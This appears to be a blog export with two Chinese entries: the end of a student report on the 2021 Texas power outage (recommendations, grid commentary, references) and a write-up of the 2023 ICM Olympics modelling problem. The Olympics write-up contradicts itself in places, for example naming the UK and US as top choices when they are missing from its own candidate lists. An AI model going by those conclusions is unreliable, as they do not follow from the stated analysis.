<li>发电机所有者应综合考虑极寒天气下机械压力、热循环疲劳、热压力等对过滤器、锅炉、管道、布线等部件与系统的影响，并制定措施预防极寒天气下的机械与电气故障。</li>
<li>发电机所有者在极寒天气来临前应考虑天气预测制定发电机组的运行计划，尽可能降低严寒天气对机组出力及可靠性的影响。</li>
<li>发电机所有者应检查发电机低频继电器、机组平衡继电器以及与控制系统相关的调节参数的设置是否匹配，避免导致发电机组在低频或频率变化过快的情况下跳闸。</li>
</ol>
<h4 id="（二）对天然气供给的建议">（二）对天然气供给的建议</h4>
<ol>
<li>国会、立法机构以及天然气设施管制机构，应要求天然气设施制定寒冷天气预防计划，包括如何应对特定的寒冷天气并运行。</li>
<li>天然气设施应采取保护措施以应对冰冻等其他寒冷天气情况，包括脆弱设备防冻、准备充足应急人员、建立互助项目等。</li>
<li>天然气生产设施的所有者或运营商应升级其检测控制与数据采集系统，以便在紧急情况下实时地增加或减少其产量。</li>
<li>由FERC牵头，组织对天然气基础设施拥有管制权的单位与区域可靠性组织等单位，建立多方论坛讨论方案以提升支撑电力系统生产的天然气基础设施的运行可靠性，讨论问题包括天然气系统的信息是否需要向电力系统共享、天然气系统防冻措施的合理补偿途径、天然气储存设备是否需要增加等。</li>
<li>功率平衡责任主体禁止关键天然气基础设施（电）负荷的需求侧响应项目，避免因需求响应项目导致天然气产量下降。</li>
<li>功率平衡责任主体与输电系统操作员（Transmission Operators，TOP）允许天然气基础设施辨识关键（电）负荷，禁止人工削减其关键负荷，负荷削减机构将这些关键负荷纳入计划方案并避免削减其负荷。</li>
</ol>
<h4 id="（三）对其他机构及政府部门的建议">（三）对其他机构及政府部门的建议</h4>
<ol>
<li>独立系统运营商（Independent System Operator, ISO）/区域输电组织（Regional Transmission Organization, RTO）及公用事业委员会应当设计合理的市场机制，补偿发电机所有者进行机组防冻改造、翻新或设计新机组时的成本。</li>
<li>在可靠性标准修改完成前的过渡时期，FERC、NERC及区域电力可靠性组织（Regional Entities），应当组织具备应对极寒天气经验的工作人员召开技术研讨会议，就如何提升机组防冻能力开展讨论。</li>
<li>规划协调机构（Planning Coordinators）应当拟定更准确的冬季系统备用边界计算流程，采用真实的冬季历史峰值负荷进行计算，同时重新考虑极寒天气下，燃气机组与风电机组的真实可用容量。</li>
<li>输电资产拥有者（Transmission Owners，TO）、输电系统操作员，应当与配电提供商（Distribution Providers，DP）、可靠性协调机构合作，评估并改进所拟定的人工负荷轮停计划。</li>
<li>州立、联邦与当地责任主体，应当考虑成立紧急事故响应中心，为电–气耦合能源系统应对极端天气事件做好充足准备。</li>
<li>功率平衡责任主体应当雇用了解天气-负荷间关联的员工，扩大其短期负荷预测的范围，采用多种预测模型、多个气象数据源，考虑区域间差异性及分布式可再生能源影响，提高短期负荷预测的精度。</li>
<li>ISO/RTO及州立公共事业委员会、立法机关应当设计合理的市场机制，对可在短时间内快速响应的需求侧管理资源，供电短缺时的关键性需求响应资源，提高能源利用效率的措施等进行奖励。</li>
<li>邻近的可靠性协调机构、功率平衡责任主体以及输电系统操作员，应当进行区域间双向季节性潮流转移的仿真计算；可靠性协调机构、输电系统操作员与配电提供商，应当定期自行开展负荷轮停场景的仿真计算，以便调度员更好地应对极寒天气。</li>
<li>规划协调机构、输电资产拥有者、输电系统操作员应当与发电机所有者、发电机运行人员进行协商，确保机组延时保护系统与电网低频减载装置之间的协调一致，由区域电力可靠性组织进行检查。</li>
<li>功率平衡责任主体、可靠性协调机构、输电系统操作员应当完善紧急事故报告机制，缩短发电机所有者、发电机运行人员与输电系统操作员报告发输电故障的时间。</li>
<li>管理天然气设施的联邦、州立相关机构，应当合作开展研究，如何制定合理的措施进一步保障极寒天气下的天然气供给。</li>
<li>ERCOT应当开展研究，评估ERCOT区域电网与邻近区域电网之间新建联络线的必要性。</li>
<li>FERC-NERC-区域电力可靠性组织团队应当开展研究，评估ERCOT在极寒天气条件下黑启动机组的可用性，并与发电机所有者合作研究ERCOT历史上发生的低频事件及重要的频率扰动事件。</li>
<li>可靠性协调机构、功率平衡责任主体、区域电力可靠性组织、输电系统操作员、输电资产拥有者、配电提供商，以及一个或多个代表美国天然气设施的机构，应当合作研究如何辨识关键的天然气设施负荷，从而更好地应对极寒天气。</li>
</ol>
<h4 id="（四）附：其他分析">（四）附：其他分析</h4>
<p>        回溯整个事件，美国作为经济强国，但只有“世界第三”级别的电网结构。同时，美国电网基础设施建设严重不足，部分政客不断推行新能源发电，但是并网支出分配不均加重开发商负担，导致可再生能源发电装机增速远不及脱碳需求。得州的停电事故，反映了调度机构对于发电机组的可调电力电量评估存在缺陷。</p>
<p>        同样处于美国中南部地区，SPP和MISO这2个区域电网由于与其他区域电网之间有较强的联络线连接、存在较为充分的功率交换，在此次极寒天气中，电力系统受到的影响较轻；而ERCOT则遭受了沉重的打击。其中一个重要原因是ERCOT仅有略超100万千瓦的直流联络线与外网相连。一正一反两个案例，使跨区电网的作用价值不辩自明。而近年来美国电网面临输电网投资不足、可再生能源消纳困难、电网安全可靠性有待提高等问题。 美国输电网投资不足、建设缓慢。美国输电网投资自上世纪70年代以来一直裹足不前，而且长期滞后于电力需求和发电容量的增长。由于输电投资水平低，跨州、跨区电网联系薄弱，输电能力不足，造成了输电瓶颈， 使拥有廉价电的州无法送至电力缺乏的州，所以美国亟须建设新的输电线路。美国输电网投资不足的原因包括两方面，一是跨州输电项目建设需要多个州的监管部门同意，有时还要多个联邦政府部门同意，审批程序复杂、审批时间长、获得批准难；二是输电项目投资回报低、建设周期长，与其他领域相比缺乏投资吸引力，影响了输电项目建设资金的筹集。</p>
<p>        ERCOT如果不采取负荷轮停措施，得州或将酿成更大范围的停电事故，而一旦发生大停电，部分黑启动机组由于缺乏天然气燃料，将无法有效发挥黑启动的功能，后果将变得更为严重。这为电力系统的规划、运行提供了启示，即需要适度增加天然气等燃料储备，尤其对于黑启动机组的燃料储备。同时，应适度增加配置长时间储能设施，如季节性储能、氢储能等，以应对极端天气下长时间的容量缺额和电量不足风险。但是除FERC活动外，迄今为止，美国涉及储能的联邦政策已被限制，涉及储能的大多数政策行动都处于州一级。国家一级的政策行动包括制定采购任务、制定激励措施，以及要求将储能纳入长期规划机制。</p>
<p>        新能源发电方面，《光伏未来研究》报告是美国能源部与美国国家可再生能源实验室共同发布的。其中指出，到2035年，如果要实现95%零碳电网目标的话，美国至少需要10亿千瓦的光伏装机容量；而达成净零排放目标，到2050年美国需要至少 30 亿千瓦的光伏装机。届时，美国光伏产业将满足全国至少 40%的电力供给。2020 年，美国全年实际上仅新增了1500万千瓦光伏装机，截至2020年底，美国累计光伏装机总量仅占全美电力供应总量的3%左右，远不及目标所需。能源互联网的特征之一是不同能源形式之间的深度融合。此次得州的停电事故，揭示了电力系统与天然气系统这2个重要基础设施之间的耦合程度日益加深，亟待研究二者之间深层次相互影响机理。</p>
<p>        复杂的分布式管理加上美国联邦体制下难以整合形成协调统一的全国性电网。美国实行自由竞争的市场经济体制，美国电网建立在私有化基础上，由不同所有权属的电网逐步互联发展起来，由于输电网产权分散、难以整合，至今难以形成全国性电网。美国联邦政治体制下，各州电网监管权限大，而联邦职责有限， 电网发展主要由各州主导，各州更多从各自利益出发，很难实现从全国能源布局及资源优化配置高度统筹规划电网发展。</p>
<p>        美国电网经过百年发展，1950年代就基本定型，70年代后得建设投资就已经陷入停滞状态。受制于“散装电网”的州绝不止得州一家，整个美国的电力系统都是分散个体的集合体。此外，市场利润的下滑以及动辄十年的项目审批建设时间都导致了私人企业在供电这个事关国计民生大事上的漠不关心。当然也没有企业愿意关心基础电力设施的维修、完善以及更新等。早在2014年，美国前能源部部长比尔·理查森已经在强调：“如果希望尽快享受到电力多样化的优势，美国必须抓紧整理电网结构，尤其是太阳能和风能。”同时，他也看到中国特高压输电技术这一项超前的输电技术，但是事实上像美国这样以利润最大化作为追求目标，同时牺牲公共风险，这种因为体制原因所带来的一系列问题是无法仅仅通过学习、效仿技术解决的<sup>[18]</sup>。</p>
<p>        尽管大额花销、政治障碍等问题尚待解决，但改善破旧的电网系统已经势在必行，美国必须坚定地展开行动。就像美国前总统艾森豪威尔大手一挥，发展跨州高速公路一样，华盛顿必须保证国内拥有可靠而高效的电力系统，避免老旧低效的电网成为阻碍美国经济和产业发展的“绊脚石”。由此看来，美国的电网系统还有很长一段路要走。</p>
<h3 id="八、参考资料">八、参考资料</h3>
<p>[1] 51878_ERCOT_Letter_re_Preliminary_Report_on_Outage_Causes <a href="https://www.ercot.com/files/docs/2021/04/06/51878_ERCOT_Letter_re_Preliminary_Report_on_Outage_Causes.pdf">https://www.ercot.com/files/docs/2021/04/06/51878_ERCOT_Letter_re_Preliminary_Report_on_Outage_Causes.pdf</a></p>
<p>[2] 应急管理部办公厅关于印发《生产安全事故调查报告编制指南（试行）》的通知 <a href="https://www.mem.gov.cn/gk/zfxxgkpt/fdzdgknr/202303/t20230316_444990.shtml">https://www.mem.gov.cn/gk/zfxxgkpt/fdzdgknr/202303/t20230316_444990.shtml</a></p>
<p>[3] 张晓萱,马莉.各自为政的美国电网[J].国家电网,2014(03):74-76.</p>
<p>[4] ISO/RTO COUNCIL – Coming together to create a smarter &amp; stronger North American power grid <a href="https://isorto.org/">https://isorto.org/</a></p>
<p>[5] Electric Reliability Council of Texas <a href="https://www.ercot.com/">https://www.ercot.com/</a></p>
<p>[6] ML11231A769 <a href="https://www.nrc.gov/docs/ML1123/ML11231A769.pdf">https://www.nrc.gov/docs/ML1123/ML11231A769.pdf</a></p>
<p>[7] 2021-Winter-Storm-Uri-AAR-Findings-Report <a href="https://www.austintexas.gov/sites/default/files/files/HSEM/2021-Winter-Storm-Uri-AAR-Findings-Report.pdf">https://www.austintexas.gov/sites/default/files/files/HSEM/2021-Winter-Storm-Uri-AAR-Findings-Report.pdf</a></p>
<p>[8] Close to 70 dead in states with severe winter weather: report | The Hill <a href="https://thehill.com/homenews/state-watch/539751-as-temperatures-expected-to-warm-approximately-70-dead-from-severe/">https://thehill.com/homenews/state-watch/539751-as-temperatures-expected-to-warm-approximately-70-dead-from-severe/</a></p>
<p>[9] Texas water shortage adds to power crisis as new winter storm moves in <a href="https://www.nbcnews.com/news/us-news/texas-contending-water-nightmare-top-power-crisis-n1258208">https://www.nbcnews.com/news/us-news/texas-contending-water-nightmare-top-power-crisis-n1258208</a></p>
<p>[10] 2021 Texas power crisis - Wikipedia <a href="https://en.wikipedia.org/wiki/2021_Texas_power_crisis">https://en.wikipedia.org/wiki/2021_Texas_power_crisis</a></p>
<p>[11] Assessment-of-Energy-System-Reliability-Failures-During-the-Extreme-Cold-Weather-Event-in-the-ERCOT-Region-PDF <a href="https://assets.jsheld.com/uploads/Assessment-of-Energy-System-Reliability-Failures-During-the-Extreme-Cold-Weather-Event-in-the-ERCOT-Region-PDF.pdf">https://assets.jsheld.com/uploads/Assessment-of-Energy-System-Reliability-Failures-During-the-Extreme-Cold-Weather-Event-in-the-ERCOT-Region-PDF.pdf</a></p>
<p>[12] February 2021 Extreme Weather Event <a href="https://www.ercot.com/news/february2021">https://www.ercot.com/news/february2021</a></p>
<p>[13] Field study shows icing can cost wind turbines up to 80% of power production – ScienceDaily <a href="https://www.sciencedaily.com/releases/2021/03/210304161058.htm">https://www.sciencedaily.com/releases/2021/03/210304161058.htm</a></p>
<p>[14] The February 2021 Cold Weather Outages in Texas and the South Central United States | FERC, NERC and Regional Entity Staff Report | Federal Energy Regulatory Commission <a href="https://www.ferc.gov/media/february-2021-cold-weather-outages-texas-and-south-central-united-states-ferc-nerc-and">https://www.ferc.gov/media/february-2021-cold-weather-outages-texas-and-south-central-united-states-ferc-nerc-and</a>)</p>
<p>[16] The freeze in Texas exposes America’s infrastructural failings | The Economist <a href="https://www.economist.com/united-states/2021/02/17/the-freeze-in-texas-exposes-americas-infrastructural-failings">https://www.economist.com/united-states/2021/02/17/the-freeze-in-texas-exposes-americas-infrastructural-failings</a></p>
<p>[15] Report on outages and curtailments during the Southwest cold weather event <a href="https://cmsstage.ferc.gov/sites/default/files/2020-07/OutagesandCurtailmentsDuringtheSouthwestColdWeatherEventofFebruary1-5-2011.pdf">https://cmsstage.ferc.gov/sites/default/files/2020-07/OutagesandCurtailmentsDuringtheSouthwestColdWeatherEventofFebruary1-5-2011.pdf</a></p>
<p>[17] The Texas Electric Grid Failure Was a Warm-up – Texas Monthly <a href="https://www.texasmonthly.com/news-politics/texas-electric-grid-failure-warm-up/">https://www.texasmonthly.com/news-politics/texas-electric-grid-failure-warm-up/</a></p>
<p>[18] 比尔·理查森,王林. 中国特高压——美国电网的救赎[N]. 中国能源报,2014-01-20(009).</p>
<h3 id="九、后记">九、后记</h3>
<p>        本次报告的完成，首先需要感谢我的父母，李宇浩、詹逸宝、葛薪茂同学等，他们提供了部分相关想法建议。同时，高电压技术教师张文婷以及研究生学长刘伟对于本次报告部分格式和内容的勘误也使本次作业更加完善。再次对能够阅读本报告并提出建议的有关人士表达衷心的谢意！</p>
<p>        再者，我想感谢我的电力系统继电保护II课程的任课教师李欣，通过这次作业，我阅读了很多关于美国电力系统历史的资料。同时，相比于事故调查报告、这份报告更像是事故调查综述。想要了解更多信息可以阅读FERC、NERC以及6所区域可靠性机构（Midwest Reliability Organization, Northeast Power Coordinating Council, ReliabilityFirst Corporation, SERC Corporation, Texas Reliability Entity and Western Electricity Coordinating Council）共同组成的调查委员会于美国当地时间2021年11月16日发布的长达316页的停电事故分析报告（见参考资料第14条）。在官方报告中有细节到电力单元的事故报告，比如4%的故障是由极端低温、冻雨天气直接造成的，31%的故障与发电机组的燃料密切相关。还有21%为与低温相关的机组内部机械系统、电气系统故障，如系统零部件在低温下发生的脆裂；仅有2%的故障是与输配电系统相关的电网侧故障等等关于事故更详细的信息。</p>
<p>        第二次世界大战结束后，美国的制造业曾经达到近全球制造业的50%。制造业曾经是美国经济的支柱，但近年来面临着许多挑战，如国际竞争、技术变革和全球化等。因此，美国经济逐渐向服务业和科技业等高附加值领域转移。但是近年来美国对于各种产品的金融化、高端化导致轻工业和加工产业，工业产业链不完整，生产加工和一部分工业转移到亚洲。虽然高新技术产业以及服务业全球领先，但是大多数重工业产业空心化，这种整体的产业结构目前来看属于亚健康的状态。美国这种资本导向的国家如果不加强建设基础设施、加快完善整体产业链，那么一旦受到任何外部因素的影响导致高附加值产业削弱，最终叫苦的只能是美国的普通人民。相比之下，中国目前大力发展实体经济，稳健发展金融，要实现国内大循环的战略就是为了规避这种产业结构偏科所造成的风险，创造更多的就业机会的同时不断创新和改进技术，以提高生产效率和产品质量，从而保持竞争力。这种技术进步不仅有利于实体经济本身的发展，也可以带动整个经济的技术进步。在防止经济区域分化和产业集中度过高的同时，为国家的经济发展带来更多机遇和挑战。</p>
]]></content>
      <categories>
        <category>电气工程</category>
      </categories>
      <tags>
        <tag>电力系统</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 ICM Problem Z The Future of the Olympics</title>
    <url>/competition/ICM/</url>
    <content><![CDATA[<h2 style="text-align:center;font-weight:700;color:#B399FF"><em>Problem Z: The Future of the Olympics</em></h2>
<img src="https://s2.loli.net/2023/09/03/nBfezvZw9c3tTVJ.png" style="zoom: 50%;" />
<h2 id="font-style-font-weight-700-color-B399FF-一、问题介绍-font"><font style="font-weight:700;color:#B399FF">一、问题介绍</font></h2>
<p>问题的主要目的是为国际奥委会（IOC）提出建议，以改善举办奥运会的方式，并确保其成功。建议需要从经济、土地使用、人类满意度（运动员和观众）、旅行、未来改善的机会、主办城市/国家的声望等不同角度考虑，并考虑可行性、实施时间表以及潜在策略对这些指标的影响。你的任务是写一份一页的备忘录，描述你的建议</p>
<h4 id="解决问题步骤">解决问题步骤</h4>
<ol>
<li>
<p>收集数据和信息：我们需要收集关于奥运会的各种数据和信息，包括过去奥运会的经验和教训、主办城市的经济和社会状况、旅行和交通状况、土地使用和环境影响等等。我们还需要了解奥林匹克项目和参赛国家的具体情况。</p>
</li>
<li>
<p>分析和评估数据：我们需要分析和评估数据，以确定哪些因素对于奥运会的成功至关重要，以及如何通过不同的策略来优化这些因素。</p>
</li>
<li>
<p>制定建议和策略：我们需要根据分析和评估的结果，制定一系列建议和策略，包括 永久奥运会地点、分组奥运会 （这两个为背景中提到过的）、改善旅行和交通、增加人类满意度、提高土地使用效率、提高经济效益和声望等等。</p>
</li>
<li>
<p>评估建议和策略的可行性和影响：我们需要评估所提出的建议和策略的可行性和影响，包括它们的成本、实施时间表、风险和潜在的好处和缺点。</p>
</li>
<li>
<p>撰写备忘录：最后，我们需要根据评估结果，将建议和策略整理成一页备忘录，包括对每个建议和策略的简要介绍、实施时间表和成本、风险和潜在影响等。</p>
</li>
</ol>
<h4 id="收集数据">收集数据</h4>
<p>收集数据是数学建模过程中至关重要的一步，因为只有准确收集和整理了足够的数据，才能对问题进行</p>
<p>充分的理解和分析，并且制定出可行的解决方案</p>
<p>一些可以找到本问题所需数据的网站：</p>
<ol>
<li>国际奥委会（IOC）官网：<a href="https://www.olympic.org/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%8F%90%E4%BE%9B%E5%8E%86%E5%B1%8A%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%8C%85">https://www.olympic.org/，这个网站可以提供历届奥运会的数据，包</a><br>
括主办城市、比赛项目、参赛国家等等。</li>
<li>国际奥委会（IOC）发布的奥运报告：<a href="https://www.olympic.org/olympic-games-report%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91">https://www.olympic.org/olympic-games-report，这个网</a><br>
站提供了历届奥运会的详细数据，可以包括参赛人数、奖牌数、比赛场馆等等。</li>
<li>Kaggle数据科学竞赛平台：<a href="https://www.kaggle.com/datasets%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8A%E6%9C%89%E5%BE%88%E5%A4%9A%E4%B8%8E%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9B%B8%E5%85%B3">https://www.kaggle.com/datasets，这个网站上有很多与奥运会相关</a><br>
的数据集，包括奥运会历史数据、奖牌榜、运动员数据等等。</li>
<li>World Bank开放数据平台：<a href="https://data.worldbank.org/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%8F%90%E4%BE%9B%E5%90%84%E5%9B%BD%E7%BB%8F%E6%B5%8E%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%A6%82">https://data.worldbank.org/，这个网站可以提供各国经济数据，如</a><br>
国内生产总值（GDP）、人均收入等等。</li>
<li>United Nations Statistics Division（联合国统计司）：<a href="https://unstats.un.org/home/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99">https://unstats.un.org/home/，这个网站</a><br>
可以提供各个国家的数据，包括人口、教育、卫生、能源等等。</li>
</ol>
<h2 id="font-style-font-weight-700-color-B399FF-二、问题分析-font"><font style="font-weight:700;color:#B399FF">二、问题分析</font></h2>
<h4 id="1-主要任务">1.主要任务</h4>
<p>为改变奥运会参赛人数不断减少的状况进行了一系列讨论，并撰写了战略备忘录和政策建议。 在找到大量背景信息后，对数据进行处理，并构建模型并进行测试以可视化数据。 在数据分析的基础上，我们寻找各个国家和地区的经济、土地利用、声誉、旅游、人民满意度等相关指标，确定指标的优先顺序，建立一系列的评估和预测模型。</p>
<p>针对这些问题，我们将采取以下措施：</p>
<ol>
<li>考虑各种因素，将其分为四个主要指标：经济指标、土地利用指标、声誉指标和人民满意度指标，然后为所有指标建立相关模型来表示它们。</li>
<li>考虑到分四个赛季举办小型奥运会以减轻举办大型赛事的负担，采用EWM-TOPSIS评价模型来衡量奥运会对主办城市/国家的影响。 TOPSIS对不同季节一定数量的国家进行评分，根据相应季节的得分来确定每个季节哪些国家适合举办奥运会。</li>
<li>利用主成分分析（PCA）对数据集进行降维，对举办奥运会的国家进行K-means聚类分析，初步筛选出综合评价较高的几个国家。 然后通过建立奥运会影响模型进行二次筛选。</li>
<li>利用影响力模型结合LSTM预测模型，将举办奥运会的影响力从14个指标简化为两个主成分，并利用奥运会影响力模型对结果进行评估和分析。</li>
<li>制定实施时间表，通过敏感性分析对模型进行评估和改进，提出建议并得出结论。<br>
具体求解流程如下图所示。</li>
</ol>
<p><img src="https://s2.loli.net/2023/09/03/7GwrNA9DEqXQamp.png" alt=""></p>
<h4 id="2-奥运会的重新分组">2.奥运会的重新分组</h4>
<p>解决申奥数量减少的困境。 我们这里考虑的解决方案是，能否将赛季数从两个增加到四个，每个赛季的比赛项目数量适度减少，这样有能力举办奥运会的国家愿意 竞标它。<br>
首先，我们需要讨论影响申奥国家数量减少的具体因素，我们从四个不同的方面构建了如下所示的指标体系。</p>
<h4 id="3-指标体系构建">3.指标体系构建</h4>
<p>为了确定影响全球各国申办奥运会的因素，制定了二级评价指标。 我们将这些指数分为四大类：经济、环境、人文和声望[6]。 将这四类形成一个由经济、土地利用、人民满意、声望四个方面组成的体系。 其中，主要指标2个（人均GDP、幸福指数），次要指标12个（生活服务业、交通出行、居民收入、健康和餐饮投入、国际旅游收入、进口总额、服务贸易出口、对外贸易）。 投资、土地利用面积、竞赛设施建设、用地面积、国家安全系数、国际地位），指标体系如下图所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/81w2WBqvEnISFJx.png" alt=""></p>
<h4 id="4-TOPSIS-EWM模型的建立">4.TOPSIS-EWM模型的建立</h4>
<p>EWM-TOPSIS是评价评分状况的有效方法，适用于任何指标。 熵起源于热力学，由香农（C.E.Shannon）引入信息论。 熵权法是一种客观赋权方法。 在具体使用过程中，熵权法利用信息熵，根据各指标的变异程度计算各指标的熵权，从而得到较为客观的指标权重。 因此，可以通过计算EWM值来确定影响评分的指标权重。 TOPSIS（Technique for Order Preference by Comparison to an Ideal Solution）方法由 C.L.Hwang 和 K.Yoon 于 1981 年首次提出。TOP-SIS 是一种根据有限数量的评价对象与理想解的接近程度进行排序的方法。 一个理想化的目标。 它是对现有对象的相对优缺点进行评价。 TOPSIS法是多目标决策分析中常用且有效的方法，又称优劣解距离法。 本文采用EWM-TOPSIS组合方法，结合两种方法的优点，从而提高数据的客观性和方法的适用范围。</p>
<h4 id="5-模型的处理结果">5.模型的处理结果</h4>
<p>由于我们提出将奥运会细分为四个赛季，考虑到不同季节的气候变化以及部分赛事的特殊性，有必要对奥运会选定的城市进行单独分析。 经过上述建模计算，参考历届申办奥运会的国家，如图3所示，划分了四个赛季的适宜城市。</p>
<h5 id="（1）冬季奥运会">（1）冬季奥运会</h5>
<p>冬奥会以户外项目为主，如滑雪、滑冰、雪橇等，硬件要求严格； 同时，场地需要充足的冰雪，因此对场地的气候要求极高。 纵观历届举办冬奥会的城市，都在北半球，此外还有北美、北欧和俄罗斯、阿尔卑斯山、东亚。 综合国力、地理位置以及历届申办名单，俄罗斯虽然综合国力排名世界第三，但由于其近期的战争行为，气候条件等因素非常适合举办冬奥会。 ，我们不会考虑，所以我们最终选择了六个国家（法国、加拿大、挪威、意大利、日本和西班牙）举办冬奥会。 各国家举办冬奥会前后的得分情况如图4、图5所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/snf6UZE57yBu4AO.png" alt=""></p>
<div align="center"><b>Figure 4: Winter Olympic candidates scores &nbsp;&nbsp;&nbsp;&nbsp; Figure 5: Fraction growth rate</b></div>
<p>从上图可以看出，加拿大是举办冬奥会的最佳选择。</p>
<h5 id="（2）夏季奥运会">（2）夏季奥运会</h5>
<p>夏季奥运会包括游泳、跳水、水球等与水有关的项目，因此对温度要求较高，如果在较冷的季节或地区举行，水面可能会结冰。 而且自第十一届奥运会以来，点燃奥运圣火是每届奥运会开幕式中必不可少的仪式之一，因此对天气有一定的要求。 夏季奥运会比赛项目增多，受到国际社会更多关注。 因此，东道国是否有国家能力和土地面积也是衡量的一个重要指标。 基于以上考虑，我们最终选定中国、法国、美国和澳大利亚作为入围名单。 如图6、图7所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/N1tkHE28QwKSXDR.png" alt=""></p>
<div align="center"><b>Figure 6: Summer Olympic candidates scores &nbsp;&nbsp;&nbsp;&nbsp; Figure 7: Rate of increase in scores</b></div>
<p>从增长率图可以看出，英国是举办夏季奥运会的最佳选择。</p>
<h5 id="（3）春季以及秋季奥运会">（3）春季以及秋季奥运会</h5>
<p>面对申办奥运会的国家越来越少，我们不禁想到，巨大的成本让很多国家望而却步。 巨大的成本是由于许多运动对场地的巨大需求。 因此，我们建议将一些夏季奥运会项目，如赛艇、帆船、皮划艇、自行车等移至春季和秋季进行。 综合考虑河流、海洋的大小和气候条件，我们最终选定中国、日本、澳大利亚、瑞典和巴西作为春秋两届奥运会的候选国，如图8和图9所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/546RwClN2uhoT8t.png" alt=""></p>
<div align="center"><b>Figure 8: Spring and autumn Olympic candidate scores &nbsp;&nbsp;&nbsp;&nbsp; Figure 9: Score growth rate</b></div>
<p>从图8可以看出，中国和美国不仅得分高，而且得分增长率也很高。 由于美国和中国拥有丰富的四季气候，两国可以跨越春秋两季的奥运会。</p>
<p>总体来看，上述选择的依据是充分的、有说服力的。 一个可能的缺点是，我们没有正确评估成本削减对主办国的影响，因为分季可能会减少一些奥运会项目。</p>
<h5 id="（4）奥运会永久举办地的选择">（4）奥运会永久举办地的选择</h5>
<p>如果仅考虑曾经举办过奥运会的国家，则应综合考虑国力、交通便利、发展潜力等因素来确定是否具备举办每届奥运会的条件。 我们进行了一系列操作来选择最合适的国家，如图10所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/u4eAUf3HN58GR1X.png" alt="Figure 10: Steps for selecting the permanent location for Olympic Games"></p>
<p>PCA（主成分分析）是一种在保持原始数据集中大部分信息的同时降低数据集维数的好方法[8]。 在进行数据降尺度处理之前，首先需要对原始数据进行归一化并计算协方差矩阵。</p>
<p>以下19个国家举办过奥运会：希腊、法国、美国、英国、瑞典、德国、比利时、荷兰、日本、芬兰、澳大利亚、意大利、墨西哥、加拿大、俄罗斯、韩国、西班牙、中国、 巴西。 我们通过K-means对上述国家进行分析。</p>
<p>我们最终通过SPSS操作上述步骤，发现样本可以分为3类。 在这三类的解释中，不难看出它们可以分为三类：较弱、一般和较强。</p>
<p>将上述举办过奥运会的国家纳入聚类分析，不难看出图11中的较强类别。在该图中，中国、法国和加拿大属于较强类别。</p>
<p><img src="https://s2.loli.net/2023/09/03/3Eb5U2VIa4NlvO6.png" alt="Figure 11: PCA and K-means clustering results graph"></p>
<h4 id="6-奥运会影响力模型构建">6.奥运会影响力模型构建</h4>
<p>我们建立了奥运会的影响模型，利用LTSM来预测每个国家假设没有举办奥运会的相关指标的数值。 然后我们比较不举办奥运会和举办奥运会之间各个指标的变化，来衡量奥运会的影响。</p>
<p>LSTM预测模型是通过选择GDP、旅游收入、国际旅客量（交通量）和GNI 4个直接影响指标建立的。 利用奥运会举办前多年的数据，预测奥运会举办后五年的各指数背景值，然后与奥运会举办后的实际统计数据进行比较。 实际统计值与LSTM模型预测的背景值（“背景值”）的差值与实际统计值的比值，就是奥运会对各因素指标影响的量化值。 表示各指标的实际统计量， 表示LSTM预测的背景值，因此奥运会对各因素指标的影响可以通过以下公式计算：</p>
<p><img src="https://s2.loli.net/2023/09/03/sq4kZNbgESedPLK.png" alt=""></p>
<p>我们之所以采用举办奥运会后前五年的相关数据，是因为举办奥运会的时间对各国的发展有着显着的影响。 据统计，有的国家在一两年内国力迅速崛起，有的国家近十年来没有明显变化。 所以我们把这五年的发展作为一个统一的标准。</p>
<p>该因素对奥运会的影响体现在奥运会成功举办五年后总净增长率（四项主要指标之和）与总实际值的比值，即奥运会举办后的影响。 主办国的比赛是量化的。 我们使用以下公式对影响力增长率进行评分。我们取平均值作为奥运会的影响力：</p>
<p><img src="https://s2.loli.net/2023/09/03/UncigX4KPJGV7OE.png" alt=""></p>
<p>为了预测奥运会举办后相关指标的变化，我们使用长短期记忆（LSTM）对这些指标的变化模式进行建模。LSTM 模型是循环神经网络 (RNN) 的变体。 它非常适合基于时间序列数据进行分类、处理和预测。 常见的 LSTM 单元由单元、输入门、输出门、记忆门和遗忘门组成。 细胞会记住任意时间间隔内的值，四个门控制进出细胞的信息流。 我们的嵌套两层 LSTM 的结构。 该模型可以分为三个独立的模块：输入模块、LSTM模块和输出模块。 如图12所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/QiXNU3hLBF6I5kj.png" alt="Figure 12: LSTM schematic diagram"></p>
<h4 id="7-结果分析">7.结果分析</h4>
<p>我们首先收集了中国、法国和加拿大在奥运会之前的相关信息，利用LSTM预测了如果他们不举办奥运会的话相关指标的发展趋势，然后根据实际数据得到净增长率 。 利用影响力模型计算各指标的影响力，并利用TOPSIS法对结果进行评分，结果如图13所示。</p>
<p><img src="https://s2.loli.net/2023/09/03/zP97fbiH3gGTapV.png" alt="Figure13: Influence model indicator changes and scores"></p>
<p>从上述指数增长分数中，可以直观地看出中国和加拿大的分数较高，并且冬奥会和夏奥会都将在这两个国家举办。 考虑到加拿大地处北半球海拔高，冬季寒冷而漫长，而中国全年气候独特且相对适宜，游客冬季体验更好。 由此，中国被选为冬季奥运会的长期主办国，加拿大被选为夏季奥运会的长期主办国。</p>
<h4 id="8-选定国家的结果和影响力的预测">8.选定国家的结果和影响力的预测</h4>
<p>在上一篇文章中，我们利用PCA降维、K-means聚类、LSTM预测和TOPSIS评分等方法，对影响各国申奥的相关指标进行了分析。 英国、中国、加拿大和美国四个国家被选为奥运会最佳举办地，分两个方案（分四个季节，夏季和冬季固定在一个地方）。</p>
